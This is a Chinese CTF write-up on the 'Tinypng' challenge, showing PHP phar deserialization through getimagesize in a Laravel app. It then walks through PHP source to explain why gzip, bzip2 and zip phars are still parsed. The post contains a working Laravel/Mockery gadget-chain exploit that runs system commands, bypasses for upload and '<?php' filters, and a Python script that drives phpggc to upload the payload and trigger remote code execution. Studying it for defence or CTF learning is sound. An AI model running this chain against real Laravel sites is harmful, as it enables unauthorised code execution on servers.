> 原文链接: https://www.anquanke.com//post/id/240007 


# 从一道题再看phar的利用


                                阅读量   
                                **226866**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t010a6f23ec2aca738a.jpg)](https://p2.ssl.qhimg.com/t010a6f23ec2aca738a.jpg)



## 前言

虎符线下有一道考察`phar`反序列化的题，当时好像只有L3H的师傅出了，比赛结束后又听其他大师傅们说了新的一些我不知道的知识，趁着机会来复现一下，顺便深挖一下代码来看一下其他的特性或者是利用点。



## Tinypng 解题思路

### <a class="reference-link" name="%E5%85%A5%E5%8F%A3%E7%82%B9"></a>入口点

这个题实现的功能主要是文件上传，这里对文件名的格式规范进行了很严谨的限制，并且会在文件名后加上`.png`，初步判断应该不是考察的webshell上传，同时在入口控制器类还设置了对`phar`文件格式内容的过滤，因此这个题大概率考察对`phar`反序列化的利用，因为`phar`也能够伪造成`png`文件，从而绕过对文件名的约束：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fa036dc54ea92ea8.png)

这里先看一下对应业务的路由:

```
Route::get('/', function () `{`
    return view('upload');
`}`);
Route::post('/', [IndexController::class, 'fileUpload'])-&gt;name('file.upload.post');

//Don't expose the /image to others!
Route::get('/image', [ImageController::class, 'handle'])-&gt;name('image.handle');
```

两个路由，第一个路由对应的就是`index`,这里我们知道是对文件上传进行处理，继续看`/image`路由:

```
class ImageController extends Controller
`{`
    public function handle(Request $request)
    `{`
        $source = $request-&gt;input('image');
        if(empty($source))`{`
            return view('image');
        `}`
        $temp = explode(".", $source);
        $extension = end($temp);
        if ($extension !== 'png') `{`
            $error = 'Don\'t do that, pvlease';
            return back()
                -&gt;withErrors($error);
        `}` else `{`
            $image_name = md5(time()) . '.png';
            $dst_img = '/var/www/html/' . $image_name;
            $percent = 1;
            (new imgcompress($source, $percent))-&gt;compressImg($dst_img);
            return back()-&gt;with('image_name', $image_name);
        `}`
    `}`
`}`
```

这里新建了一个图片压缩类然后对图片进行压缩处理，跟进`compressImg`方法:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e9e13a769d2c5e85.png)

先调用`_openImage()`打开图片后在调用`_saveImage`对文件进行压缩处理，看下`_openImage()`方法:

```
public function __construct($src, $percent = 1)
    `{`
        $this-&gt;src = $src;
        $this-&gt;percent = $percent;
    `}`
private function _openImage()
    `{`
        list($width, $height, $type, $attr) = getimagesize($this-&gt;src);
        $this-&gt;imageinfo = array(
            'width' =&gt; $width,
            'height' =&gt; $height,
            'type' =&gt; image_type_to_extension($type, false),
            'attr' =&gt; $attr
        );
        $fun = "imagecreatefrom" . $this-&gt;imageinfo['type'];
        $this-&gt;image = $fun($this-&gt;src);
        $this-&gt;_thumpImage();
    `}`
```

这里`getimagesize`是能够进行phar反序列化的,如果`$this-&gt;src`可控，那么phar反序列化的入口就找到了，这里是否可控呢?这里`$this-&gt;src`是通过构造方法赋值，因此就是前面新初始化的imgcompress实例的`$source`，而这个`$source`就是传参的值，因此这里能够进行可以反序列化

### <a class="reference-link" name="%E6%9E%84%E9%80%A0Gadget%20Chains"></a>构造Gadget Chains

结合配置文件知道Laravel的版本后其实就可以去网上搜`Gadget Chains`了，在这里对其中一个链子进行详细的分析，这个链子实际上还是Laravel框架中**mockery组件**的漏洞

入口是在`PendingBroadcast.php`中的析构函数:

```
public function __construct(Dispatcher $events, $event)
`{`
        $this-&gt;event = $event;
        $this-&gt;events = $events;
`}`
public function __destruct()
`{`
    $this-&gt;events-&gt;dispatch($this-&gt;event);
`}`
```

这里我们可以调用任意类的`dispatch`方法，并且该方法的参数也是可控的，这里选择`dispatcher.php`中的dispatch方法，跟进一下:

```
public function dispatch($command)
    `{`
        return $this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)
                        ? $this-&gt;dispatchToQueue($command)
                        : $this-&gt;dispatchNow($command);
    `}`
```

这里我们需要的是`$this-&gt;dispatchToQueue`这个方法，我们先跟进这个方法:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010b9fdcab042a4b2e.png)

可以看到，在这里调用了`call_user_func`，如果`$this-&gt;queueResolver`和`$connection`都是可控的，那么在这里我们可以调用任意的静态类方法，就有可能实现命令执行

[![](https://p1.ssl.qhimg.com/t013cb24887b82216e0.png)](https://p1.ssl.qhimg.com/t013cb24887b82216e0.png)

该类的构造方法告诉我们,第一个参数是可控的，在看第二个参数`$command`之前，如果我们要执行`$this-&gt;dispatchToQueue`方法，就需要前两个表达式均成立，第一个表达式可以成立，而第二个`$this-&gt;commandShouldBeQueued($command)`跟进一下:

[![](https://p1.ssl.qhimg.com/t0101888d2fd551e7ec.png)](https://p1.ssl.qhimg.com/t0101888d2fd551e7ec.png)

需要`$command`实现ShouldQueue接口,因此我们构造的`$command`还必须是实现该接口的某个类,在这里使用的是`BroadcastEvent.php`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01491b22fd1fa67155.png)

只要实现该接口的类应该都是可以利用的，这样过了前两个表达式后就可以成功进入`$this-&gt;dispatchToQueue($command)`方法:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01081fb9f7acf2fdef.png)

全局搜索一下eval方法；发现存在:

```
class EvalLoader implements Loader
`{`
    public function load(MockDefinition $definition)
    `{`
        if (class_exists($definition-&gt;getClassName(), false)) `{`
            return;
        `}`

        eval("?&gt;" . $definition-&gt;getCode());
    `}`
`}`
```

该EvalLoader类的load方法存在`eval()`

call_user_func函数在第一个参数为数组的时候，第一个参数就是我们选择的类，第二个参数是类下的方法；所以这里直接去到EvalLoader类，去执行load方法从而调用到eval函数；这里发现存在参数，而且参数必须是MockDefinition类的实例,也即是意味着我们connection需要为MockDefinition类的实例,并且要执行`eval`,必须使得`if`返回`false`

接追溯到MockDefinition类:

```
public function __construct(MockConfiguration $config, $code)
    `{`
        if (!$config-&gt;getName()) `{`
            throw new \InvalidArgumentException("MockConfiguration must contain a name");
        `}`
        $this-&gt;config = $config;
        $this-&gt;code = $code;
    `}`
public function getClassName()
    `{`
        return $this-&gt;config-&gt;getName();
    `}`
public function getCode()
    `{`
        return $this-&gt;code;
    `}`
```

全局搜索`getName()`方法，并且实现`MockConfiguration`接口,找到了`MockConfiguration.php`中:

```
public function getName()
    `{`
        return $this-&gt;name;  //$this-&gt;name是可控的
    `}`
```

因此当我们使得`$this-&gt;config`为该类时，那么调用getName能够返回任意值，从而使得该任意值组成的类不存在而调用eval,而`$this-&gt;code`就是拼接在`eval`中的命令

贴下完成的exp:

```
&lt;?php

namespace Illuminate\Broadcasting`{`
    use Illuminate\Contracts\Events\Dispatcher;
    class PendingBroadcast
    `{`
        protected $event;
        //__destruct析构方法是调用$this-&gt;events类的dispatch方法，这里是调用Dispatcher类的dispatch方法
        protected $events;
        public function __construct($events, $event)
        `{`
        //event是dispatch方法的参数,也就是$command,而$command需要实现ShouldQueue接口,因此这里$event是选择BroadcastEvent类
        $this-&gt;event = $event;
        $this-&gt;events = $events;
        `}`
    `}`
`}`

namespace Illuminate\Broadcasting`{`
    class BroadcastEvent`{`
        //这里$connection作为call_user_func的第二个参数，也就是静态类EvalLoader中load()方法的参数，也就是$definition
        public $connection;
        public function __construct($connection)
        `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus`{`
    class Dispatcher
    `{`

        public function __construct($queueResolver)
        `{`
            //queueResolver是后续call_user_func_array()的第一个参数，这里我们需要调用静态类方法执行eval
            $this-&gt;queueResolver = $queueResolver;
        `}`
        //$command需要实现ShouldQueue接口时commandShouldBeQueued方法才会返回真，这里使用BroadcastEvent类
        public function dispatch($command)
        `{`
            //需要使三目运算符的判断式为真，才能调用dispatchToQueue方法进而调用call_user_func_array
            return $this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)
                        ? $this-&gt;dispatchToQueue($command)
                        : $this-&gt;dispatchNow($command);
        `}`
    `}`
`}`

namespace Mockery\Loader`{`
    use Mockery\Generator\MockDefinition;
    class EvalLoader
    `{`
        //这里$definition需要实现MockDefinition接口，因此选取的是MockDefinition类
        public function load(MockDefinition $definition)`{``}`
    `}`
`}`

namespace Mockery\Generator`{`
    class MockDefinition
    `{`
        protected $config;
        protected $code;
        //这里$this-&gt;config设置为MockConfiguration类，其getname方法和参数可控能够得到任意字符作为getClassName()的返回值
        public function __construct($config, $code)
        `{`
            $this-&gt;config = $config;
            //$this-&gt;code 作为EvalLoader类中load方法中eval()的拼接参数，也就是我们需要实现命令执行的地方
            $this-&gt;code = $code;    
        `}`        
    `}`
`}`
namespace Mockery\Generator`{`
    class MockConfiguration`{`
        protected $name;
        public function __construct($name)
        `{`
            $this-&gt;name = $name;   
        `}`
    `}`
`}`

namespace`{`
    //先使得$this-&gt;name返回crispr,这样调用class_exists()时没有crispr类肯定会返回false
    $mockconfiguration = new Mockery\Generator\MockConfiguration("crispr");
    //使得$this-&gt;config为MockConfiguration类后调用getname方法,后面为eval的拼接参数，这里写个一句话
    $mockdefinition = new \Mockery\Generator\MockDefinition($mockconfiguration,'&lt;?php echo system("cat /flag");?&gt;');
    $evalloader = new \Mockery\Loader\EvalLoader();
    //MockDefinition类实现了MockDefinition接口作为load方法的参数
    $broadcastevent = new Illuminate\Broadcasting\BroadcastEvent($mockdefinition);
    //该dispatcher调用EvalLoader的load方法
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,"load"));
    //第一个参数为调用Dispatcher类的dispact方法,第二个参数是实现ShouldQueue的$command
    $exp = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$broadcastevent);

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头
    $phar-&gt;setMetadata($exp); //将自定义meta-data存入manifest
    $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar-&gt;stopBuffering();
`}`
```

不过即使是添加`gif`头，还是会有`&lt;?php __HALT_COMPILER(); ?&gt;`存在，并且必须以`__HALT_COMPILER();?&gt;`来结尾，否则phar扩展将无法识别这个文件为phar文件

这里先介绍**两种姿势**:

**姿势1**

将phar文件进行gzip压缩后在修改为png文件后缀，当进行完gzip压缩后就没有这些字符了，从而就能够进行绕过，至于为什么将phar文件gzip压缩后还能反序列化成功，这里**在后文会进行分析**

[![](https://p2.ssl.qhimg.com/t015b9154eef339a92f.png)](https://p2.ssl.qhimg.com/t015b9154eef339a92f.png)

**姿势2**

我们可以将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则

```
$phar_file = serialize($exp);
    echo $phar_file;
    $zip = new ZipArchive();
    $res = $zip-&gt;open('1.zip',ZipArchive::CREATE); 
    $zip-&gt;addFromString('crispr.txt', 'file content goes here');
    $zip-&gt;setArchiveComment($phar_file);
    $zip-&gt;close();
```

这里用姿势1得到phar包再gzip压缩后将其改名为png上传后，在通过`/image`路由来触发`phar`反序列化:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b7f5f892f3a721c1.png)

这里在利用姿势2进行演示，不过在这里写入zip注释的时候,由于这里拼接时是这用进行拼接的

```
eval("?&gt;".$str);
```

因此想要利用肯定会出现被ban的字符`&lt;?php`,这里能够通过将序列化数据小写的s转换成大写S后，将之后的关键词通过16进制进行填充从而绕过,这个考点在绕过%00时也曾出现过:

```
//bypass %00
function process_serialized($serialized) `{`
        $new = '';
        $last = 0;
        $current = 0;
        $pattern = '#\bs:([0-9]+):"#';

        while(
            $current &lt; strlen($serialized) &amp;&amp;
            preg_match(
                $pattern, $serialized, $matches, PREG_OFFSET_CAPTURE, $current
            )
        )
        `{`

            $p_start = $matches[0][1];
            $p_start_string = $p_start + strlen($matches[0][0]);
            $length = $matches[1][0];
            $p_end_string = $p_start_string + $length;

            # Check if this really is a serialized string
            if(!(
                strlen($serialized) &gt; $p_end_string + 2 &amp;&amp;
                substr($serialized, $p_end_string, 2) == '";'
            ))
            `{`
                $current = $p_start_string;
                continue;
            `}`
            $string = substr($serialized, $p_start_string, $length);

            # Convert every special character to its S representation
            $clean_string = '';
            for($i=0; $i &lt; strlen($string); $i++)
            `{`
                $letter = $string`{`$i`}`;
                $clean_string .= ctype_print($letter) &amp;&amp; $letter != '\\' ?
                    $letter :
                    sprintf("\\%02x", ord($letter));
                ;
            `}`

            # Make the replacement
            $new .= 
                substr($serialized, $last, $p_start - $last) .
                'S:' . $matches[1][0] . ':"' . $clean_string . '";'
            ;
            $last = $p_end_string + 2;
            $current = $last;
        `}`

        $new .= substr($serialized, $last);
        return $new;

`}`
```

这里我将链子序列化得到的数据转化大写后在使用16进制绕过`&lt;?php`的限制:

```
$phar_file = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:`{`S:6:"events";O:25:"Illuminate\Bus\Dispatcher":1:`{`S:13:"queueResolver";a:2:`{`i:0;O:25:"Mockery\Loader\EvalLoader":0:`{``}`i:1;S:4:"load";`}``}`S:5:"event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:`{`S:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:`{`S:6:"config";O:35:"Mockery\Generator\MockConfiguration":1:`{`S:4:"name";S:6:"crispr";`}`S:4:"code";S:31:"\3c\3f\70\68\70 echo system("cat /flag");";`}``}``}`';
    $zip = new ZipArchive();
    $res = $zip-&gt;open('1.zip',ZipArchive::CREATE); 
    $zip-&gt;addFromString('crispr.txt', 'file content goes here');
    $zip-&gt;setArchiveComment($phar_file);
    $zip-&gt;close();
```

将zip改为png后缀进行上传，之后在触发phar反序列化从而实现RCE

[![](https://p3.ssl.qhimg.com/t01fc4fa0e97f85ac9b.png)](https://p3.ssl.qhimg.com/t01fc4fa0e97f85ac9b.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7phpggc"></a>利用工具phpggc

由于是`Laravel`主流框架，这里也可以直接使用`phpggc`来利用Laravel的链子直接生成phar包之后在通过`gzip`压缩,经过测试发现`phpggc`对Laravel的RCE5和RCE6两条链子都能成功，其中RCE5的链子就是上述所说，RCE6的链子稍微简便一点，这里感兴趣的大佬们可以自己再去分析下

贴一下调用phpggc使用**Laralvel/RCE6**写的exp:

```
# -*- coding=utf-8 -*-
# Author:Crispr
# 注意放在phpggc根目录运行

import os
import requests
import sys
import re

url = "http://b6a64602-069f-454e-a440-bfa1cfa72d57.node3.buuoj.cn/"
session = requests.session()

def create_gzfile():
    cmd = r"""php -d'readonly=0' ./phpggc Laravel/RCE6 "system('whoami');" --phar phar &gt; crispr.phar"""
    os.system(cmd)
    cmd = r"gzip crispr.phar"
    os.system(cmd)
    cmd = r"mv crispr.phar.gz crispr.phar.png"
    os.system(cmd)



def get_upload_png_path():
    files = `{`"file" : ("crispr.phar.png" , open("./crispr.phar.png","rb+"),"image/png")`}`
    r = session.post(url,files=files)
    if r.status_code == 200:
        text = r.text
        #print(text)
        path = re.findall('path: (.*?)\.png',text)[0]
        #print(path)
        return path
    else:
        print("upload false")
        return False

def deserialize(path):
    url1 = url + "image?image=phar://../storage/app/" + path + ".png"
    print(url1)
    r = session.get(url1)
    print(r.text)

if __name__ == "__main__":
    create_gzfile()
    path = get_upload_png_path()
    print(path)
    deserialize(path)
    os.unlink("crispr.phar.png")
```

[![](https://p1.ssl.qhimg.com/t01d7123590a8e86b42.png)](https://p1.ssl.qhimg.com/t01d7123590a8e86b42.png)



## 从源码来看phar的利用

前文说到，将`phar`包压缩成gzip仍然能够触发反序列化，并且将phar写入到zip注释中也同样能达到如上的效果,其实并不只有这些，将Phar压缩成`tar、gzip、bzip2`后均能够触发反序列化，下面将从zend角度来试分析一下其原因。

先来看下phar是为何能够进行反序列化的呢?<br>
在`phar.c`中:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0128298f83d37ce310.png)

在对metadata进行解析的时候会进行`php_var_unserialize()`将Phar中的metadata进行反序列化，这里也不做多讨论，那为何使用`file_get_contents`等同样能够触发反序列化呢?这里zsx大师傅在`Phar与Stream Wrapper造成PHP RCE的深入挖掘`已经进行原因的深入分析，这里也一起分析一下:<br>
需要从stream流说起,PHP中每一种流都实现了一个包装器(wrapper)，包装器包含一些额外的代码用来处理特殊的协议和编码。PHP提供了一些内置的包装器，我们也可以很轻松的创建和注册自定义的包装器。我们甚至可以使用上下文(contexts)和过滤器来改变和增强包装器。

以`file_get_contents`为例<br>
在`/etc/standard/file.c`中我们来看一下对流的处理:

```
stream = php_stream_open_wrapper_ex(filename, "rb",
                (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,
                NULL, context);
    if (!stream) `{`
        RETURN_FALSE;
    `}`
```

通过调试的方式来跟踪调用情况<br>
file_get_contents实际上调用了`php_stream_open_wrapper_ex`函数，进一步跟进该函数发现调用`php_stream_locate_url_wrapper`函数来通过传递的url来得到包装器的类型

[![](https://p0.ssl.qhimg.com/t01a4c749763f152c17.png)](https://p0.ssl.qhimg.com/t01a4c749763f152c17.png)

查看phar注册的wrapper可以发现如下定义:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01eea9eaf5f8f6447f.png)

这里大部分函数的实现都会调用`phar_parse_url`参数

[![](https://p4.ssl.qhimg.com/t0132757547a1d25e8e.png)](https://p4.ssl.qhimg.com/t0132757547a1d25e8e.png)

这个函数再调用`phar_open_or_create_filename -&gt; phar_create_or_parse_filename -&gt; phar_open_from_fp -&gt; phar_parse_pharfile -&gt; phar_parse_metadata -&gt; phar_var_unserialize`最终实现了phar文件中metadata的反序列化操作:

[![](https://p2.ssl.qhimg.com/t01d47633a0c51759ca.png)](https://p2.ssl.qhimg.com/t01d47633a0c51759ca.png)

在`phar_open_from_fp`中也可以看到，如果想将其作为phar文件识别，则必须包含该token,也就是`__HALT_COMPILER(); ?&gt;`才会调用`phar_parse_pharfile`来进行解析

可以发现整个解析phar的顶层函数其实是来自`php_stream_open_wrapper`,因此当PHP函数中底层调用了`php_stream_open_wrapper`,都能够被phar的组件用来进行解析Phar文件(文件内容需要包含__HALT_COMPILER(); ?&gt;)

因此当全局搜索`php_stream_open_wrapper`被用来实现底层的PHP函数时也就不难发现还存在除对文件处理的函数之外其余的可以用来利用的函数,而`getimagesize`就是其中之一:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011bcc7f2b088eed7c.png)

在`php_getimagesize_from_any`调用了`php_stream_open_wrapper`,支持phar组件也能够识别Phar文件格式进而实现phar反序列化,而PHP函数`getimagesize`则直接调用前者

[![](https://p4.ssl.qhimg.com/t01b3d6bd336da5b6d8.png)](https://p4.ssl.qhimg.com/t01b3d6bd336da5b6d8.png)

为何将phar文件进行压缩成`phar.gz`后还能触发反序列化操作?<br>
我们知道当注册了phar组件后构造**phar://phar.phar**的url能够通过`php_stream_locate_url_wrapper`来查询得到对应的组件

[![](https://p3.ssl.qhimg.com/t01992aaf7ac3965c3f.png)](https://p3.ssl.qhimg.com/t01992aaf7ac3965c3f.png)

得到phar组件后随后会进入到`phar_wrapper_open_url`中，在其中就会调用`phar_parse_url`来对其形式进行解析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0159b223246868bd80.png)

我们跟进`phar_parse_url`来查看其对url的解析处理:

[![](https://p2.ssl.qhimg.com/t0125b497b3c43afa06.png)](https://p2.ssl.qhimg.com/t0125b497b3c43afa06.png)

该函数应该是对`filename`进行了切割然后将`$this-&gt;schema初始化为phar`，将`$this-&gt;host初始化为arch`,这里的arch在`phar_split_fname`进行了说明<br>
继续跟进`phar_split_fname`函数:<br>**注意官方给的注释**

```
/**
 * Process a phar stream name, ensuring we can handle any of:
 *
 * - whatever.phar
 * - whatever.phar.gz
 * - whatever.phar.bz2
 * - whatever.phar.php
 *
 * Optionally the name might start with 'phar://'
 *
 * This is used by phar_parse_url()
 */
int phar_split_fname(const char *filename, size_t filename_len, char **arch, size_t *arch_len, char **entry, size_t *entry_len, int executable, int for_create) /* `{``{``{` */
`{`
    const char *ext_str;
#ifdef PHP_WIN32
    char *save;
#endif
    size_t ext_len;

    if (CHECK_NULL_PATH(filename, filename_len)) `{`
        return FAILURE;
    `}`

    if (!strncasecmp(filename, "phar://", 7)) `{`
        filename += 7;
        filename_len -= 7;
    `}`

    ext_len = 0;
#ifdef PHP_WIN32
    save = (char *)filename;
    if (memchr(filename, '\\', filename_len)) `{`
        filename = estrndup(filename, filename_len);
        phar_unixify_path_separators((char *)filename, filename_len);
    `}`
#endif
    if (phar_detect_phar_fname_ext(filename, filename_len, &amp;ext_str, &amp;ext_len, executable, for_create, 0) == FAILURE) `{`
        if (ext_len != -1) `{`
            if (!ext_str) `{`
                /* no / detected, restore arch for error message */
#ifdef PHP_WIN32
                *arch = save;
#else
                *arch = (char*)filename;
#endif
            `}`
```

在这里对应的arch就是其文件名称，这里我们不是去对phar文件进行写入，而是对已有的文件名进行解析,因此会调用`phar_open_from_filename`函数,继续跟进该函数,注意这里前两个参数就是对应filename的值和长度

[![](https://p1.ssl.qhimg.com/t01555887d245e62384.png)](https://p1.ssl.qhimg.com/t01555887d245e62384.png)

```
int phar_open_from_filename(char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, char **error) /* `{``{``{` */
`{`
    php_stream *fp;
    zend_string *actual;
    int ret, is_data = 0;

    if (error) `{`
        *error = NULL;
    `}`

    if (!strstr(fname, ".phar")) `{`
        is_data = 1;
    `}`

    if (phar_open_parsed_phar(fname, fname_len, alias, alias_len, is_data, options, pphar, error) == SUCCESS) `{`
        return SUCCESS;
    `}` else if (error &amp;&amp; *error) `{`
        return FAILURE;
    `}`
    if (php_check_open_basedir(fname)) `{`
        return FAILURE;
    `}`

    fp = php_stream_open_wrapper(fname, "rb", IGNORE_URL|STREAM_MUST_SEEK, &amp;actual);

    if (!fp) `{`
        if (options &amp; REPORT_ERRORS) `{`
            if (error) `{`
                spprintf(error, 0, "unable to open phar for reading \"%s\"", fname);
            `}`
        `}`
        if (actual) `{`
            zend_string_release_ex(actual, 0);
        `}`
        return FAILURE;
    `}`

    if (actual) `{`
        fname = ZSTR_VAL(actual);
        fname_len = ZSTR_LEN(actual);
    `}`

    ret =  phar_open_from_fp(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error);

    if (actual) `{`
        zend_string_release_ex(actual, 0);
    `}`

    return ret;
`}`
```

如果`filename`出现`.phar`则`$is_data=0`，否则`$is_data=1`随后进入`phar_open_parsed_phar`中,当存在.phar时则会:

```
if (!is_data) `{`
    /* prevent any ".phar" without a stub getting through */
    if (!phar-&gt;halt_offset &amp;&amp; !phar-&gt;is_brandnew &amp;&amp; (phar-&gt;is_tar || phar-&gt;is_zip)) `{`
        if (PHAR_G(readonly) &amp;&amp; NULL == (stub = zend_hash_str_find_ptr(&amp;(phar-&gt;manifest), ".phar/stub.php", sizeof(".phar/stub.php")-1))) `{`
            if (error) `{`
                spprintf(error, 0, "'%s' is not a phar archive. Use PharData::__construct() for a standard zip or tar archive", fname);
            `}`
            return FAILURE;
        `}`
    `}`
`}`
```

这里对phar文件进行了一个判断，大致是判断其是不是一个标准的phar文件,如果不是则会报错返回false,不过这里并没有对phar有任何实质性的处理,继续向下:<br>
通过`php_stream_open_wrapper`得到该文件的stream,此处可以理解为是句柄,得到phar文件的句柄后调用`phar_open_from_fp`,跟进该函数:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d6d0d72e28ffdca2.png)

存在三种压缩形式的幻数,这里肯定会对其进行处理,继续向下看，分别列出对应几种压缩形式幻数的处理:<br>**对zip的处理**<br>
判断是否是zip格式后如果是则直接调用phar_parse_zipfile对zipphar进行处理,这里我们可以稍后再说，先往后两个看

```
if (!memcmp(pos, zip_magic, 4)) `{`
    php_stream_seek(fp, 0, SEEK_END);
    return phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error);
`}`
```

**对gzip的处理**<br>
判断是否存在该gzip幻数后可以看到通过`php_stream_filter_create`来创建了一个`zlib.inflate`的解压的过滤器进行解压

[![](https://p0.ssl.qhimg.com/t01c4041adcaf95bf89.png)](https://p0.ssl.qhimg.com/t01c4041adcaf95bf89.png)

**对bzip的处理**<br>
同上述一样判断完成后也是建立了一个`bzip2.decompress`的过滤器对fp进行解压缩处理

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011c922b097c7597df.png)

上述对bzip2和gzip的处理都是通过中间值temp先对fp进行相应的解压处理后写入temp中最后在通过`fp = temp`来实现对fp的重新覆盖，也就是说这里会对这两种文件先进行解压处理

[![](https://p5.ssl.qhimg.com/t01a060f12ad4e31650.png)](https://p5.ssl.qhimg.com/t01a060f12ad4e31650.png)

注意底层额外实现了直接对zipphar和tarphar的处理,因此即使是phar压缩成zip和tar,也同样可以进行相应的处理，马上在后文进行分析

最后调用:

```
if (got &gt; 0 &amp;&amp; (pos = phar_strnstr(buffer, got + sizeof(token), token, sizeof(token)-1)) != NULL) `{`
    halt_offset += (pos - buffer); /* no -tokenlen+tokenlen here */
  return phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error);
        `}`
```

当调用`phar_parse_pharfile`后，之后的也就和前文最开始利用是一致的了，利用`php_var_serialize`对phar中的metadata进行反序列化操作

**zip的处理**<br>
在`tinypng`那题的处理中第二种姿势是将序列化的内容写入了zip注释中,同样能够触发phar反序列化,其原因就在`phar_parse_zipphar`中，函数内容太多，这里挑取重点:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011df39d7d5c35771b.png)

